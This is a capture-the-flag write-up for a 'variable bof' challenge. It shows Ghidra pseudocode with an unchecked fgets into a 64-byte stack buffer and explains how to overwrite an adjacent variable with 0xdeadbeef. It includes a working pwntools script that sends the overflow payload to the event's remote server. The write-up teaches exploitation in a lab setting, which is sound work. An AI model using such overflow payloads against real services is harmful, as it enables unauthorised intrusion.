# variable bof
![image](https://user-images.githubusercontent.com/34862954/164884883-ec4ea2ec-b96c-4770-bd14-fd0584328d66.png)

## Approach
Once again, disassembly the file with ghidra to view the pseudocode.
```c

void main(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_168 [64];
  int local_128;
  char local_118 [264];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  banner();
  local_128 = 0;
  fgets(local_168,0x100,stdin);
  if (local_128 == -0x21524111) {
    __stream = fopen("./flag.txt","r");
    fgets(local_118,0x100,__stream);
    green();
    printf("[*] Flag: %s\n",local_118);
    reset();
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  green();
  puts("[!] Flag has\'nt changed try again");
  reset();
                    /* WARNING: Subroutine does not return */
  exit(1);
}


```

Hmmmm.<br>
Here we have to make the value of `local_128` as `-0x21524111`\
Wait what's that? Negative hex?\
Well if you convert that hex into decimal and then convert it to hex by 2's compliment\
It's `0xdeadbeef` ðŸ”¥

Now how can make that `local_128` equal to `0xdeadbeef`?!<br>
We need to know that the stack grows downward<br>
![image](https://user-images.githubusercontent.com/34862954/164883524-0d5bc8f8-9613-4e18-bbd1-1fc260d963c9.png)

So we need the bufferflow attack like this. first 64 A's then deadbeef but in reverse order

![image](https://user-images.githubusercontent.com/34862954/164884035-e9b0b1c2-d862-4953-bfb2-b754e84df1b8.png)

Now our attack string is `'A'*64 + '\xEF\xBE\xAD\xDE'`

I used pwntools to make the attack as manually copying the string won't work as it may hv some non printable characters.

```python
from pwn import *


conn = remote('wannahack.copsiitbhu.co.in',2420)
conn.recvline()
conn.recvline()
conn.recvline()
conn.recvline()

#just dont forget this '\n' at the end 
payload = 'A'*64 +'\xEF\xBE\xAD\xDE' + '\n' 

conn.send(payload)
print(conn.recvline())

conn.close()
```

This will do the work. Yeah, pwntools are simply awesome!!
![image](https://user-images.githubusercontent.com/34862954/164884849-de65b57a-9fc5-42b7-9424-f620b2b9bf5a.png)
Yay u got the flag.

Flag: `wannahack{H0w_d1d_y0u_c5@ng3_M3_!!!!!}`


